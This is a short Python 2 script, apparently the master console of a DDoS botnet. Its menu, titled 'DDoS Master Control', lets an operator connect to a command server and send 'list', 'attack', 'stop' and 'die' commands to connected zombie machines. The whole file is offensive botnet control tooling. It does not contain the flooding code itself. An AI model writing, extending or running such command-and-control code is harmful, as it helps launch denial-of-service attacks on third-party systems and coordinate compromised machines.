# telnet program example
import socket, select, string, sys

def printmenu():
    print "==============================="
    print "===== DDoS Master Control ====="
    print "==============================="
    print ""
    print "Choose option [1-4]:"
    print "List all zombies connected\t[1]"
    print "Send attack command\t\t[2]"
    print "Send stop command\t\t[3]"
    print "Close connection from server\t[4]"
    return int(raw_input())

def receivemessage(socket):
    data = socket.recv(1024)
    if not data :
        print 'Connection closed'
        sys.exit()
    else :
        #print data
        sys.stdout.write("Server Response: " + data + "\n")
        return data

#main function
if __name__ == "__main__":

    if(len(sys.argv) < 3) :
        print 'Usage : python master.py hostname port'
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    # connect to remote host
    try :
        s.connect((host, port))
    except :
        print 'Unable to connect'
        sys.exit()

    print 'Connected to remote host'

    alive = 1;

    try:
        while alive:
            option = printmenu()

            if option == 1:
                s.send("list")
                receivemessage(s)
            elif option == 2:
                s.send("attack")
                receivemessage(s)
            elif option == 3:
                s.send("stop")
                receivemessage(s)
            elif option == 4:
                s.send("die")
                receivemessage(s)
                alive = 0
            else:
                print "Invalid option."

            raw_input("Press Enter to continue...")
    except KeyboardInterrupt:
        # Fim do programa
        print "Disconnecting..."
        s.send("die")
        sys.exit()
